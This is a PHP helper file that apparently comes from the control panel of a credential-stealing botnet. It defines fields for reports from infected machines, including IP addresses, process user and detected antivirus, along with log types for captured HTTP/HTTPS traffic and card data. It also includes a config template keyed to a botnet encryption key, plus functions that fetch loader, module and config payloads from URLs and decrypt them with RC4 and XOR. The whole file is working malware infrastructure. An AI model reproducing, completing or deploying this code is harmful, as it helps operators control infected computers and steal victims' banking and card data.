<?php

error_reporting(E_ALL); 

define("SQL_CODEPAGE", "utf8");
define("SQL_COLLATE",  "utf8_unicode_ci");
define("LIVE_AUTH_COOKIE", 60 * 30);
define("TPL_PATH", "template/");

define("SCRIPT_SENDED", 1);
define("SCRIPT_EXECUTE", 2);
define("SCRIPT_ERROR", 3);

define("VER_NT_WORKSTATION", 1);
define("X32", 0);
define("X64", 9);

define("CURRENT_TIME", time(0));

define("HEADER_SIZE", 48);
define("HEADER_MD5", 32);
define("ITEM_HEADER_SIZE", 16);

define('SBCID_BOT_ID', 10001);
define('SBCID_BOT_VERSION', 10003);
define('SBCID_NET_LATENCY', 10005);
define('SBCID_TCPPORT_S1', 10006);
define('SBCID_PATH_SOURCE', 10007);
define('SBCID_PATH_DEST', 10008);
define('SBCID_TIME_SYSTEM', 10009);
define('SBCID_TIME_TICK', 10010);
define('SBCID_TIME_LOCALBIAS', 10011);
define('SBCID_OS_INFO', 10012);
define('SBCID_LANGUAGE_ID', 10013);
define('SBCID_PROCESS_NAME', 10014);
define('SBCID_PROCESS_USER', 10015);
define('SBCID_IPV4_ADDRESSES', 10016);
define('SBCID_IPV6_ADDRESSES', 10017);
define('SBCID_BOTLOG_TYPE', 10018);
define('SBCID_BOTLOG', 10019);
define('SBCID_LAST_UPDATE', 10020);
define('SBCID_BOT_AV', 10021);

define('SBCID_SCRIPT_ID', 11000);
define('SBCID_SCRIPT_STATUS', 11001);
define('SBCID_SCRIPT_RESULT', 11002);

define('SBCID_LOADER_HASH', 11003);
define('SBCID_BOT_HASH', 11004);
define('SBCID_CONFIG_HASH', 11005);

define("BLT_HTTP_REPORT", 11);
define("BLT_HTTPS_REPORT", 12);
define("BLT_CC", 13);

define("BLT_GD_REPORT", 201);

set_time_limit(60 * 10);
ini_set("memory_limit", "256M");

$db_con = false;

function CsrConnectToDb() {
	extract($GLOBALS["config"]);
	$db_con = mysqli_connect($sql_host, $sql_user, $sql_pass, $sql_db);
	if ($db_con) mysqli_query($db_con, "set names " . SQL_CODEPAGE);
	$GLOBALS["db_con"] = $db_con;
	return $db_con;
}

function CsrListTables()
{
  $tableList = array();
  $res = mysqli_query($GLOBALS["db_con"], "SHOW TABLES");
  while($cRow = mysqli_fetch_array($res)) $tableList[] = $cRow[0];
  
  return $tableList;
}

function CsrSqlQueryRows($query) 
{
	$req = mysqli_query($GLOBALS["db_con"], $query);
	if (!$req) return array();
	
	$rows = array();
	while ($row = mysqli_fetch_assoc($req)) $rows[] = $row;
		 
	return $rows;
}

function CsrSqlQueryRow($query) {
	$arr = CsrSqlQueryRows($query);
	if (count($arr) > 0) return $arr[0];
	return false;
}

function CsrSqlQueryRowEx($query) 
{
	$row = CsrSqlQueryRow($query);
	if (is_array($row))
		foreach ($row as $k => $v) return $row[$k];
	
	return false;
}

function CsrSqlQuery($query) {
	return mysqli_query($GLOBALS["db_con"], $query);
}

function CsrSetCookie($name, $value, $time) {
	setcookie($name, $value, time() + $time, '/');
}

function CsrGetCookie($name) {
	if (isset($_COOKIE[$name])) return $_COOKIE[$name];
	return false;
}

function CsrRemoveCookie($name) {
	CsrSetCookie($name, false, -1);
}

function CsrCheckAuth($user, $pass) {
	return $GLOBALS["config"]["user"] == $user && $GLOBALS["config"]["pass"] == $pass;
}

function CsrGetStrTime() {
	return date("M d Y H:i:s", CURRENT_TIME);
}

function CsrGetConfigTpl()
{
	$config_tpl = 
		'<?php
		$config = array();

		$config["user"] = "%s";
		$config["pass"] = "%s";

		$config["sql_host"] = "%s";
		$config["sql_user"] = "%s";
		$config["sql_pass"] = "%s";
		$config["sql_db"] = "%s";

		$config["botnet_crypt_key"] = "%s";
		$config["bot_timeout"] = %d;
		
		$config["loader_url"] = "%s";
		$config["module_url"] = "%s";
		$config["config_url"] = "%s";
		
		$config["cache_file"] = "%s";
		?>';
		
	return $config_tpl;
}

function CsrCacheReset($t, $url)
{
	global $config;
	
	$crc = '';
	$retVal = false;

	$path = "tmp/" . $config["cache_file"];
	if (filesize($path) == 12) {
		$fp = fopen($path, "rb");
		$crc = fread($fp, 12);
		fclose($fp);
	}
	else {
		$crc = pack("LLL", 0, 0, 0);
	}
	
	if ($t == 0) 
	{
		$loaderData = @file_get_contents($url);
		
		if ($loaderData) {
			$crc = substr_replace($crc, pack("L", crc32($loaderData) & 0xffffffff), 0, 4); 
			$retVal = true;
		}
	}
	else if ($t == 1) 
	{
		$moduleData = @file_get_contents($url);
		if ($moduleData) {
			CsrRc4Crypt($moduleData, $config['botnet_crypt_key']);
			$crc = substr_replace($crc, substr($moduleData, -4, 4), 4, 4); 
			$retVal = true;
		}
	}
	else if ($t == 2) 
	{
		$configData = @file_get_contents($url);	
		
		if ($configData) {
			$binKey = CsrArrToBin(CsrRc4Init($config['botnet_crypt_key']));
			$key = substr($binKey, 0, 16);
			//BinStorage::_unpack
			CsrSimpleCrypt($configData, $key);
			CsrRc4Crypt($configData, $config['botnet_crypt_key']);
			$configData = substr($configData, HEADER_SIZE, -256);
			
			$crc = substr_replace($crc, pack("L", crc32($configData) & 0xffffffff), 8, 4); 
			$retVal = true;
		}
	}
	
	if ($retVal === true)
	{
		$fp = @fopen($path, "wb");
		if ($fp) {
			fwrite($fp, $crc);
			fclose($fp);
		} else {
			$retVal = false;
		}
	}
	
	return $retVal;
}

function CsrToUint($str) {
  $q = @unpack('L', $str);
  return is_array($q) && is_numeric($q[1]) ? ($q[1] < 0 ? sprintf('%u', $q[1]) : $q[1]) : 0;
}

function CsrGetAv($id) {
	$av = array("Unknown", "Avast", "Avg", "Avira", "MSE", "Nod32", "Symantec", "KIS", "McAfee", "Panda", "TrendMicro", "Bitdefender");
	if (!isset($av[$id])) return "Unknown";
	return $av[$id];
}

function htmlEntitiesEx($string)
{
  return htmlspecialchars(preg_replace('|[\x00-\x09\x0B\x0C\x0E-\x1F\x7F-\x9F]|u', ' ', $string), ENT_QUOTES, 'UTF-8');
}

function CsrRc4Init($key) 
{
  $hash      = array();
  $box       = array();
  $keyLength = strlen($key);
  
	if ($keyLength == 0) {
		return false;
	}
	
  for ($x = 0; $x < 256; $x++) {
    $hash[$x] = ord($key[$x % $keyLength]);
    $box[$x]  = $x;
  }
	
	for ($y = $x = 0; $x < 256; $x++) {
    $y       = ($y + $box[$x] + $hash[$x]) % 256;
    $tmp     = $box[$x];
    $box[$x] = $box[$y];
    $box[$y] = $tmp;
  }
	
  return $box;
}

function CsrRc4Crypt(&$data, $key) 
{
	$key = CsrRc4Init($key);
	$len = strlen($data);
	
	if ($len == 0) return false;
	
		for($z = $y = $x = 0; $x < $len; $x++) 
	{
    $z = ($z + 1) % 256;
    $y = ($y + $key[$z]) % 256;

    $tmp      = $key[$z];
    $key[$z]  = $key[$y];
    $key[$y]  = $tmp;
    $data[$x] = chr(ord($data[$x]) ^ ($key[(($key[$z] + $key[$y]) % 256)]));
  }
}

function CsrArrToBin($arr) {
	$bin = "";
	$cnt = count($arr);
	for ($i = 0; $i < $cnt; ++$i) 
		$bin .= chr($arr[$i]);
	return $bin;
}

function CsrSimpleCrypt(&$buf, $key)
{
	$len = strlen($buf);
	
	for ($i = 0, $j = 0; $i < $len; ++$i, ++$j)
	{
		if ($j == strlen($key)) $j = 0;
		
		$buf[$i] = chr(ord($buf[$i]) ^ ord($key[$j]));
	}
}

function CsrXorCrypt(&$data, $key) 
{
	$len = strlen($data);
	for ($i = 0; $i < $len; ++$i) $data{$i} ^= $key;
}

function CsrNavigationGetPage() {
	if (!isset($_GET['page'])) {
		$page = 1;
	}
	else {
		$page = (int)$_GET['page'];
	}
	return $page;
}

function CsrNavigation($url, $cnt, $n, $page_limit) 
{
	if ($cnt <= $n) return false;
	
	$page = CsrNavigationGetPage();
	$navigation = '';
	
	if ($page > $page_limit) {
		if ($page % $page_limit == 0) {
			$prev_page = $page - $page_limit;
		} else {
			$prev_page = ($page - ($page % $page_limit));
		}
		$navigation .= "<li class=\"enabled\"><a href=\"" . $url . "&page=" . $prev_page . "\"> << </a></li>";
	} else {
		$navigation .= "<li class=\"disabled\"><a href=\"#\"> << </a></li>";
	}

	if ($page % $page_limit == 0) {
		$begin = $page - $page_limit;
	}
	else {
		$begin = ($page - ($page % $page_limit));	
	}
	
	$begin += 1;
	$end = $begin + $page_limit;
	$max_pages = ceil($cnt / $n);
	
	for ($i = $begin; $i < $end && $i <= $max_pages; ++$i) 
	{
		if ($page == $i) {
			$navigation .= "<li class=\"active\"><a href=\"" . $url . "&page=" . $i . "\">" . $i . "</a></li>";
		}
		else {
			$navigation .= "<li><a href=\"" . $url . "&page=" . $i . "\">" . $i . "</a></li>";
		}
	}
	
	if ($max_pages <= $page_limit) {
		$navigation .= "<li class=\"disabled\"><a href=\"#\"> >> </a></li>";
		return $navigation;
	}
	
	if ($page % $page_limit == 0) {
		$next_page = $page + 1;
	} else {
		$next_page = $page + ( $page_limit - ($page % $page_limit) ) + 1;
	}
	
	if ($next_page <= $max_pages) {
		$navigation .= "<li class=\"enabled\"><a href=\"" . $url . "&page=" . $next_page . "\"> >> </a></li>";
	} else {
		$navigation .= "<li class=\"disabled\"><a href=\"#\"> >> </a></li>";
	}
	
	return $navigation;
}

function CsrVersion($ver) {
	return ord($ver{0}) . "." . ord($ver{1}) . "." . ord($ver{2});
}

function CsrGetTickTime($tc) {
	return sprintf('%02u:%02u:%02u', $tc / 3600, $tc / 60 - (sprintf('%u', ($tc / 3600)) * 60), $tc - (sprintf('%u', ($tc / 60)) * 60));
}

function CsrHtmlEntitiesEx($string)
{
  return htmlspecialchars(preg_replace('|[\x00-\x09\x0B\x0C\x0E-\x1F\x7F-\x9F]|u', ' ', $string), ENT_QUOTES, 'UTF-8');
}

function CsrIntToVersion($i)
{
  return sprintf("%u.%u.%u", ($i >> 24) & 0xFF, ($i >> 16) & 0xFF,($i >> 8) & 0xFF);
}

function CsrCleanTmp() {
	$files = glob("tmp/*");
	$c = count($files);
	if (count($files) > 0) {
		foreach ($files as $file) {   
			if (strpos($file, "index.php") !== false) {
				continue;
			}
			if (strpos($file, "update_data") !== false) {
				continue;
			}
			if (file_exists($file)) {
				unlink($file);
			}   
		}
	}
}

function CsrToSqlSafeMask($str)
{
	return str_replace(array('%', '_'), array('\%', '\_'), $str);
}

function CsrSqlListToExp($l)
{
  $l = explode("\x01", $l);
  $s = array();
  
  foreach ($l as $v)
  {
    $v = trim($v);
    if (strlen($v) > 0) {
	  //if (spaceCharsExist($v)) $v = '"' . addcslashes($v, '"') . '"';
      $s[] = $v;
    }
  }
  
  return implode(' ', $s);
}

function CsrExpressionToArray($exp)
{
  $list = array();
  $len = strlen($exp);
  
  for($i = 0; $i < $len; $i++)
  {
    $cur = ord($exp[$i]);
    
    //Пропускаем пробелные символы.
    if($cur == 0x20 || ($cur >= 0x9 && $cur <= 0xD)) continue;
        
    //Проверяем ковычку.
    if($cur == 0x22 || $cur == 0x27)
    {
      for($j = $i + 1; $j < $len; $j++)if(ord($exp[$j]) == $cur)
      {
        //Подсчитываем количество слешей.
        $c = 0;
        for($k = $j - 1; ord($exp[$k]) == 0x5C; $k--)$c++;
        if($c % 2 == 0)break; //При четном количестве слешей до ковычки, наша ковычка это не спец. символ.
      }
      if($j != $len)$i++; //Если не достигнут конец, убираем первую ковычку.
      
      $type = 1;
    }
    //Простое копирование до первого пробела.
    else
    {
      for($j = $i + 1; $j < $len; $j++)
      {
        $cur = ord($exp[$j]);
        if($cur == 0x20 || ($cur >= 0x9 && $cur <= 0xD))break;
      }
      
      $type = 0;
    }
	
    $list[] = array(substr($exp, $i, $j - $i), $type);
    $i = $j;
  }
  
  return $list;
}

function CsrExpressionToSqlLists($exp)
{
  $list = CsrExpressionToArray($exp);
  $l = array();
  
  foreach($list as $item)
  {
    $l[] = str_replace("\x01", "\x02", $item[0]);
  }
  
  return addslashes(count($l) > 0 ? ("\x01" . implode("\x01", $l) . "\x01") : '');
}


function GetPercent($v1, $v2) 
{
	if ($v2 == 0)
		return 0;
		
	return sprintf("%.1f", $v1 * 100 / $v2);
}

function OsDataToString($os_data) 
{
  $name = 'Unknown';
	
  if (strlen($os_data) == 6)
  {
    $data = @unpack('Cversion/Csp/Sbuild/Sarch', $os_data);
    
	switch($data['version'])
    {
		case 2: $name = 'XP'; break;
		case 3: $name = 'Server 2003'; break;
		case 4: $name = 'Vista'; break;
		case 5: $name = 'Server 2008'; break;
		case 6: $name = 'Seven'; break;
		case 7: $name = 'Server 2008 R2'; break;
		case 8: $name = 'Eight'; break;
		case 9: $name = 'Server 2012'; break;
		case 10: $name = 'Eight+'; break;
		case 11: $name = 'Server 2012 R2'; break;
		case 12: $name = 'Ten'; break;
    }
    
    if ($data['arch'] == 9) $name .= ' x64';
   
    if ($data['sp'] > 0) $name .= ', SP ' . $data['sp'];
  }
  return $name;
}

function ToSqlSafeMask($str) {
  return str_replace(array('%', '_'), array('\%', '\_'), $str);
}
?>
